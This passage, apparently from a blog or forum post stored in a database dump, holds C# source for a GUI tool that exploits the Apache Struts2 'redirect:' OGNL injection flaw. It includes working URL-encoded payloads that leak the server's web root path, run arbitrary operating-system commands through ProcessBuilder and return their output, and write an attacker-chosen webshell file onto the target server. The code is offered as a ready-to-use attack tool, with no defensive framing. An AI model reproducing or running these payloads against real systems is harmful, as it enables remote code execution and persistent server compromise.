uest.Create(uri);\r\n                request.UserAgent = \"Mozilla/5.0\";\r\n                request.Accept = \"*/*\";\r\n                request.Method = \"POST\";\r\n                request.Timeout = 30000;\r\n                request.KeepAlive = true;\r\n                request.AllowAutoRedirect = false;\r\n                request.ContentType = \"application/x-www-form-urlencoded\";\r\n                Stream stream = request.GetRequestStream();\r\n                Byte[] b = Encoding.UTF8.GetBytes(data);\r\n                stream.Write(b, 0, b.Length);\r\n                stream.Close();\r\n                StreamReader sr = new StreamReader(request.GetResponse().GetResponseStream(), Encoding.GetEncoding(htmlEncode));\r\n                String html = sr.ReadToEnd();\r\n                return html;\r\n\r\n            }\r\n            catch (Exception e)\r\n            {\r\n                loginfo(e.Message);\r\n                MessageBox.Show(e.Message);\r\n            }\r\n            return \"\";\r\n        }\r\n        public void getInfo() {\r\n            loginfo(\"正在获取Web信息，请稍等片刻........\");\r\n            String exp = \"redirect:${%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}\";\r\n            String html = getHtml(this.txt_url.Text, exp, \"UTF-8\");\r\n            this.txt_info.Text = html;\r\n            if (html.IndexOf(\"dir:\")!=-1) {\r\n                MessageBox.Show(\"存在最新的Struts2漏洞\");\r\n                loginfo(\"验证结果：存在最新的Struts2漏洞....\");\r\n            }\r\n            loginfo(\"获取Web信息完毕......\");\r\n\r\n        }\r\n        public void executeCmd() {\r\n            String cmd = this.txt_cmd.Text;\r\n            if(cmd.Equals(\"\")){\r\n                loginfo(\"请输入命令........\");\r\n                return;\r\n            }\r\n            loginfo(\"正在执行命令中，请稍等片刻........\");\r\n            String [] cmds=cmd.Split(&#39; &#39;);\r\n            String cmdstr = \"\";\r\n            foreach (String c in cmds) {\r\n\r\n                cmdstr = cmdstr + \"\"\" + c + \"\",\";\r\n            }\r\n            cmdstr=Uri.EscapeDataString(cmdstr.Substring(0, cmdstr.Length - 1));\r\n            //String exp = \"redirect:${%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.getWriter().println(%23req.getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}\";\r\n            String exp = \"redirect:${%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\" + cmdstr + \"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()}\";\r\n            String html=getHtml(this.txt_url.Text, exp, \"UTF-8\");\r\n            this.txt_cmdResult.Text = html;\r\n            loginfo(\"命令执行完毕........\");\r\n        }\r\n\r\n        private void btn_upload_Click(object sender, EventArgs e)\r\n        {\r\n\r\n            Thread th = new Thread(new ThreadStart(getShell));\r\n            th.Start();\r\n        }\r\n\r\n        public void getShell() {\r\n            loginfo(\"正在准备上传文件中，请稍等片刻........\");\r\n            String shellName = this.txt_shellName.Text;\r\n            String shellPath = this.txt_shellPath.Text;\r\n            String shellContent = Uri.EscapeDataString(this.txt_shellContent.Text);\r\n            String exp = \"redirect:${%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22\" + shellName + \"%22)).append(%23req.getParameter(%22shell%22)).close()}&amp;shell=\" + shellContent;\r\n            if (!\"如：/home/web/shell.jsp\".Equals(shellPath) &amp;&amp;!\"\".Equals(shellPath))\r\n            {\r\n                exp = \"redirect:${%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22\"+this.txt_shellPath.Text+\"%22)).append(%23req.getParameter(%22shell%22)).close()}&amp;shell=\"+shellContent;\r\n            }\r\n\r\n            String html =getHtml(this.txt_url.Text, exp, \"UTF-8\");\r\n            String result = \"上传文件失败\";\r\n            if (html.IndexOf(\"okokok\") != -1)\r\n            {\r\n                result = \"上传文件成功\"; \r\n            }\r\n            loginfo(result+\"........\");\r\n            MessageBox.Show(result); \r\n        }\r\n\r\n        public void loginfo(String log){\r\n            this.txt_log.AppendText(log+\"----\"+DateTime.Now+\"\r\n\");\r\n        }\r\n\r\n        private void btn_startCmd_Click(object sender, EventArgs e)\r\n        {\r\n            Thread th = new Thread(new ThreadStart(executeCmd));\r\n            th.Start();\r\n        }\r\n\r\n        private void btn_download_file_Click(object sender, EventArgs e)\r\n        {\r\n            MessageBox.Show(\"禁用此功能！\");\r\n        }\r\n    }\r\n}</pre>\r\n<p>\r\n	<br />\r\n</p>', 'shack2', '1641', '